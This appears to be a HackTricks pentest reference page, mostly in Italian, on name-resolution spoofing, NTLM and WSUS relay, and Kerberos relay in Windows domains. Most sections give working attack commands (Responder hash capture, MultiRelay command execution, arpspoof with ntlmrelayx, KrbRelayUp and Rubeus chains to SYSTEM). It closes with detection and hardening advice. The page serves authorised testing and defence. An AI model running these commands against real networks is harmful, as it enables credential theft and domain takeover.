# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Network Protocols

### Local Host Resolution Protocols

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft e altri sistemi operativi usano LLMNR e NBT-NS per la risoluzione dei nomi locali quando il DNS fallisce. Allo stesso modo, sistemi Apple e Linux usano mDNS.
- Questi protocolli sono suscettibili di intercettazione e spoofing a causa della loro natura non autenticata e broadcast su UDP.
- [Responder](https://github.com/lgandx/Responder) e [Dementor](https://github.com/MatrixEditor/Dementor) possono essere usati per impersonare servizi inviando risposte contraffatte agli host che interrogano questi protocolli.
- Ulteriori informazioni sull'impersonificazione di servizi usando Responder possono essere trovate [qui](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD permette ai browser di scoprire automaticamente le impostazioni del proxy.
- La discovery è facilitata tramite DHCP, DNS, o fallback a LLMNR e NBT-NS se il DNS fallisce.
- Responder può automatizzare attacchi WPAD, indirizzando i client verso server WPAD malevoli.

### Responder/Dementor for Protocol Poisoning

- **Responder** è uno strumento usato per il poisoning di query LLMNR, NBT-NS e mDNS, rispondendo selettivamente in base ai tipi di query, mirato principalmente ai servizi SMB.
- È preinstallato in Kali Linux, configurabile in `/etc/responder/Responder.conf`.
- Responder mostra gli hash catturati a schermo e li salva nella directory `/usr/share/responder/logs`.
- Supporta sia IPv4 che IPv6.
- La versione Windows di Responder è disponibile [qui](https://github.com/lgandx/Responder-Windows).

- **Dementor** estende i temi del multicast poisoning e agisce inoltre come rogue service provider (incluso supporto CUPS RCE)
- La struttura generale è simile a **Responder** con configurazione più granulare. (default è qui: [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Compatibilità tra **Dementor** e **Responder** è disponibile qui: [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Intro e Documentazione qui: [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Risolve problemi di cattura introdotti da Responder su alcuni protocolli

#### Running Responder

- To run Responder with default settings: `responder -I <Interface>`
- For more aggressive probing (with potential side effects): `responder -I <Interface> -P -r -v`
- Techniques to capture NTLMv1 challenges/responses for easier cracking: `responder -I <Interface> --lm --disable-ess`
- WPAD impersonation can be activated with: `responder -I <Interface> --wpad`
- NetBIOS requests can be resolved to the attacker's IP, and an authentication proxy can be set up: `responder.py -I <interface> -Pv`

#### Running Dementor

- With detault settings applied: `Dementor -I <interface>`
- With default settings in analysis mode: `Dementor -I <interface> -A`
- Automatic NTLM session downgrade (ESS): `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Run current session with custom config: `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning with Responder

- Spoofing delle risposte DHCP può avvelenare permanentemente le informazioni di routing di una vittima, offrendo un'alternativa più stealth rispetto all'ARP poisoning.
- Richiede una conoscenza precisa della configurazione della rete target.
- Esecuzione dell'attacco: `./Responder.py -I eth0 -Pdv`
- Questo metodo può catturare efficacemente hash NTLMv1/2, ma richiede gestione attenta per evitare interruzioni di rete.

### Capturing Credentials with Responder/Dementor

- Responder/Dementor impersoneranno servizi usando i protocolli menzionati sopra, catturando credenziali (solitamente NTLMv2 Challenge/Response) quando un utente tenta di autenticarsi contro i servizi spoofati.
- Si possono tentare downgrade a NetNTLMv1 o disabilitare ESS per facilitare il cracking delle credenziali.

If you already have a **writable SMB share that victims browse**, you can coerce outbound SMB without spoofing by planting UNC-based lure files (SCF/LNK/library-ms/desktop.ini/Office) generated with ntlm_theft, then catching the authentication with Responder. See the [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

È fondamentale notare che l'impiego di queste tecniche deve avvenire in modo legale ed etico, assicurando l'autorizzazione appropriata ed evitando interruzioni o accessi non autorizzati.

## Inveigh

Inveigh è uno strumento per penetration testers e red teamer, progettato per sistemi Windows. Offre funzionalità simili a Responder, eseguendo spoofing e attacchi man-in-the-middle. Lo strumento è evoluto da uno script PowerShell a un binario C#, con [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) e [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) come versioni principali. Parametri dettagliati e istruzioni sono disponibili nella [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh può essere eseguito tramite PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Oppure eseguito come un C# binary:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Questo attacco sfrutta le sessioni di autenticazione SMB per accedere a una macchina target, concedendo una shell di sistema se ha successo. I prerequisiti principali includono:

- L'utente che si autentica deve avere accesso Local Admin sull'host verso cui viene relayed.
- SMB signing dovrebbe essere disabilitato.

#### 445 Port Forwarding and Tunneling

In scenari in cui l'introduzione diretta in rete non è fattibile, il traffico sulla porta 445 deve essere forwarded e tunneled. Strumenti come [**PortBender**](https://github.com/praetorian-inc/PortBender) aiutano a reindirizzare il traffico della porta 445 verso un'altra porta, operazione essenziale quando è disponibile accesso Local Admin per il driver loading.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Altri strumenti per NTLM Relay Attack

- **Metasploit**: Configurare con proxies, dettagli di host locale e remoto.
- **smbrelayx**: uno script Python per il relaying di sessioni SMB e per eseguire comandi o distribuire backdoor.
- **MultiRelay**: uno strumento della suite Responder per relay di utenti specifici o di tutti gli utenti, eseguire comandi o dump hashes.

Ogni strumento può essere configurato per operare tramite un SOCKS proxy se necessario, permettendo attacchi anche con accesso di rete indiretto.

### Funzionamento di MultiRelay

MultiRelay viene eseguito dalla directory _**/usr/share/responder/tools**_, mirando a indirizzi IP specifici o a utenti.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### RelayKing – scoperta dei target relayabili e liste curate di relay

RelayKing è un auditor dell'esposizione NTLM relay che mappa dove i relay sono utilizzabili e produce liste di target pronte all'uso per `ntlmrelayx.py -tf`. Controlla l'hardening dei protocolli (SMB signing/channel binding; HTTP/HTTPS/MSSQL/LDAP/LDAPS EPA/CBT; RPC auth) e segnala coercion/reflection helpers (PetitPotam/PrinterBug/DFSCoerce, WebClient/WebDAV, NTLMv1, CVE-2025-33073 reflection).

- L'autenticazione migliora l'affidabilità delle verifiche HTTPS/LDAPS CBT e MSSQL EPA; il livello di SMB signing/signature viene sondato senza autenticazione.
- Il pathing cross-protocol sfrutta i riscontri di Net-NTLMv1 confermati (`--ntlmv1`/`--ntlmv1-all`); viene fornita una classificazione di gravità per ogni percorso.
- `--gen-relay-list <file>` scrive una lista di target compatibile con grep per `ntlmrelayx.py -tf <file>` per evitare tentativi ed errori.
- `--coerce-all` attiva massivamente PetitPotam/DFSCoerce/PrinterBug contro tutti i target; `--ntlmv1-all` (RemoteRegistry) e `--audit` (domain-wide LDAP host pull) sono **rumorosi** e generano molti logon/accessi remoti.
- `--proto-portscan` accelera la scansione saltando le porte chiuse; `--krb-dc-only` è utile quando i DC bloccano NTLM ma altri servizi lo accettano ancora.

Esempi di scansioni:
```bash
# Authenticated audit across multiple protocols + generate relay list for ntlmrelayx
python3 relayking.py -u lowpriv -p 'P@ssw0rd!' -d lab.local --dc-ip 10.0.0.10 \
--audit --protocols smb,ldap,ldaps,mssql,http,https --proto-portscan --ntlmv1 \
--threads 10 -vv -o plaintext,json --output-file relayking-scan --gen-relay-list relaytargets.txt

# Unauthenticated CIDR sweep for SMB/LDAP/HTTP relayability
python3 relayking.py --null-auth --protocols smb,ldap,http --proto-portscan -o plaintext 10.10.0.0/24
```
Questi strumenti e tecniche costituiscono un set completo per condurre attacchi NTLM Relay in vari ambienti di rete.

### Abuso di WSUS HTTP (8530) per NTLM Relay verso LDAP/SMB/AD CS (ESC8)

I client WSUS si autenticano al loro server di aggiornamento usando NTLM su HTTP (8530) o HTTPS (8531). Quando HTTP è abilitato, i check-in periodici dei client possono essere forzati o intercettati sul segmento locale e relayati con ntlmrelayx verso endpoint LDAP/LDAPS/SMB o AD CS HTTP (ESC8) senza crackare alcun hash. Questo si integra con il normale traffico di update e spesso produce autenticazioni di account macchina (HOST$).

Cosa cercare
- Configurazione GPO/registro in HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate e ...\WindowsUpdate\AU:
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (hours)
- Endpoint SOAP WSUS usati dai client su HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Porte di default: 8530/tcp HTTP, 8531/tcp HTTPS

Ricognizione
- Non autenticato
- Scan per listener: nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Intercetta il traffico WSUS HTTP tramite MITM a livello L2 e registra client/endpoint attivi con wsusniff.py (solo HTTP a meno che tu non riesca a far fidare i client del tuo certificato TLS).
- Autenticato
- Analizza i GPO in SYSVOL per le chiavi WSUS con MANSPIDER + regpol (lo wrapper wsuspider.sh riassume WUServer/WUStatusServer/UseWUServer).
- Interroga gli endpoint a scala dai host (NetExec) o localmente:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

Passaggi end-to-end per il relay HTTP
1) Posizionati per un MITM (stesso L2) in modo che un client risolva il server WSUS verso di te (ARP/DNS poisoning, Bettercap, mitm6, etc.). Esempio con arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Reindirizza la porta 8530 al tuo listener di relay (opzionale, comodo):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Avvia ntlmrelayx con l'HTTP listener (richiede il supporto Impacket per l'HTTP listener; vedi i PR qui sotto):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Altri target comuni:
- Relay a SMB (se signing off) per exec/dump: -t smb://<host>
- Relay a LDAPS per modifiche di directory (es., RBCD): -t ldaps://<DC>
- Relay a AD CS web enrollment (ESC8) per emettere un certificato e poi autenticarsi via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
Per percorsi di abuso AD CS e tooling più profondi, vedi la pagina AD CS:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Forza un check-in del client o aspetta lo schedule. Dal client:
wuauclt.exe /detectnow
or use the Windows Update UI (Check for updates).

5) Usa le sessioni SOCKS autenticate (se -socks) o i risultati del relay per post-exploitation (modifiche LDAP, operazioni SMB, o emissione di certificati AD CS per successive autenticazioni).

Vincolo HTTPS (8531)
- L'intercettazione passiva di WSUS su HTTPS è inefficace a meno che i client non si fidino del tuo certificato. Senza un certificato trusted o un altro break TLS, l'handshake NTLM non può essere raccolto/relayato dal traffico WSUS HTTPS.

Note
- WSUS è stato annunciato deprecato ma rimane ampiamente distribuito; HTTP (8530) è ancora comune in molti ambienti.
- Helper utili: wsusniff.py (osservare i check-in WSUS HTTP), wsuspider.sh (enumerare WUServer/WUStatusServer dai GPO), NetExec reg-query a scala.
- Impacket ha ripristinato il supporto per l'HTTP listener in ntlmrelayx in PR #2034 (originariamente aggiunto in PR #913).

### Force NTLM Logins

In Windows **potresti essere in grado di forzare alcuni account privilegiati ad autenticarsi su macchine arbitrarie**. Leggi la seguente pagina per imparare come:


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

Una Kerberos relay attack ruba un ticket AP-REQ da un servizio e lo riutilizza contro un secondo servizio che condivide la stessa chiave dell'account macchina (perché entrambi gli SPN risiedono sullo stesso account macchina `$`). Questo funziona anche se le classi di servizio degli SPN differiscono (es. `CIFS/` → `LDAP/`) perché la *chiave* che decripta il ticket è l'NT hash della macchina, non la stringa SPN stessa e la stringa SPN non fa parte della firma.

A differenza del NTLM relay, il salto è limitato allo *stesso host* ma, se punti a un protocollo che permette di scrivere su LDAP, puoi concatenare in Resource-Based Constrained Delegation (RBCD) o enrollment AD CS e ottenere NT AUTHORITY\SYSTEM in un solo colpo.

Per informazioni dettagliate su questo attacco consulta:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Nozioni di base su Kerberos**

| Token | Scopo | Rilevanza per il relay |
|-------|---------|-----------------|
| **TGT / AS-REQ ↔ REP** | Dimostra l'utente al KDC | non interessato |
| **Service ticket / TGS-REQ ↔ REP** | Vincolato a un singolo **SPN**; cifrato con la chiave del proprietario dello SPN | intercambiabile se gli SPN condividono account |
| **AP-REQ** | Il client invia `TGS` al servizio | **ciò che rubiamo e riproduciamo** |

* I ticket sono cifrati con la **chiave derivata dalla password dell'account che possiede lo SPN**.
* L'**Authenticator** dentro l'AP-REQ ha un timestamp di 5 minuti; il replay dentro quella finestra è valido fino a che la cache del servizio non vede un duplicato.
* Windows raramente verifica se la stringa SPN nel ticket corrisponde al servizio che stai colpendo, quindi un ticket per `CIFS/HOST` normalmente si decripta correttamente su `LDAP/HOST`.

- 2. **Cosa deve essere vero per poter effettuare un relay Kerberos**

1. **Chiave condivisa:** SPN sorgente e target appartengono allo stesso account macchina (default sui server Windows).
2. **Nessuna protezione del canale:** SMB/LDAP signing off e EPA off per HTTP/LDAPS.
3. **Puoi intercettare o forzare l'autenticazione:** LLMNR/NBNS poison, DNS spoof, **PetitPotam / DFSCoerce RPC**, fake AuthIP, rogue DCOM, ecc.
4. **La sorgente del ticket non sia già stata usata:** vinci la corsa prima che il pacchetto reale arrivi o bloccala completamente; altrimenti la cache di replay del server genera Event 4649.
5. Devi in qualche modo poter eseguire un **MitM nella comunicazione** (es. essere parte del gruppo DNSAmins per modificare il DNS del dominio o poter cambiare il file HOST del victim).

### Kerberos Relay Steps

- 3.1 **Recon the host**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Avvia il relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` incapsula **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** in un unico binary.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce fa sì che il DC ci invii un ticket Kerberos `CIFS/DC01`.

- 3.4 **Relay the AP-REQ**

KrbRelay estrae il blob GSS da SMB, lo riconfeziona in un bind LDAP e lo inoltra a `ldap://DC01`—l'autenticazione riesce perché la **stessa chiave** lo decifra.

- 3.5 **Abuse LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Ora possiedi **NT AUTHORITY\SYSTEM**.


### **Altri percorsi da conoscere**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Un fake server invia un **GSS-ID payload** con qualsiasi SPN; il client costruisce un AP-REQ diretto verso di te | Funziona anche attraverso subnet; machine creds by default |
| **DCOM / MSRPC** | Un OXID resolver malevolo forza il client ad auth verso uno SPN e una porta arbitrari | Priv-esc *local* puro; aggira il firewall |
| **AD CS Web Enroll** | Relay machine ticket to `HTTP/CA` and get a cert, then **PKINIT** to mint TGTs | Elude le difese di LDAP signing |
| **Shadow Credentials** | Scrivi `msDS-KeyCredentialLink`, poi PKINIT con forged key pair | Non è necessario aggiungere un computer account |

### **Risoluzione dei problemi**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Ticket key ≠ target key | Host/SPN sbagliato |
| `KRB_AP_ERR_SKEW` | Clock > 5 min offset | Sincronizza l'orologio o usa `w32tm` |
| LDAP bind fails | Signing enforced | Usa il percorso AD CS o disabilita lo signing |
| Event 4649 spam | Service saw duplicate Authenticator | Bloccare o provocare una race rispetto al pacchetto originale |


### **Rilevamento**

* Aumento di **Event 4769** per `CIFS/`, `HTTP/`, `LDAP/` dalla stessa sorgente in pochi secondi.
* **Event 4649** sul servizio indica un replay rilevato.
* Logon Kerberos da **127.0.0.1** (relay verso lo SCM locale) è altamente sospetto—mappalo tramite la regola Sigma nei documenti KrbRelayUp.
* Monitora le modifiche agli attributi `msDS-AllowedToActOnBehalfOfOtherIdentity` o `msDS-KeyCredentialLink`.

## **Rafforzamento**

1. **Imporre LDAP & SMB signing + EPA** su ogni server.
2. **Split SPNs** in modo che HTTP non sia sullo stesso account di CIFS/LDAP.
3. Patchare i vettori di coercizione (PetitPotam KB5005413, DFS, AuthIP).
4. Imposta **`ms-DS-MachineAccountQuota = 0`** per impedire l'aggiunta non autorizzata di computer al dominio.
5. Genera alert su **Event 4649** e su logon Kerberos di loopback inaspettati.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)
- [RelayKing v1.0](https://github.com/depthsecurity/RelayKing-Depth)
- [Depth Security – Introducing RelayKing: Relay to Royalty](https://www.depthsecurity.com/blog/introducing-relayking-relay-to-royalty/)

{{#include ../../banners/hacktricks-training.md}}
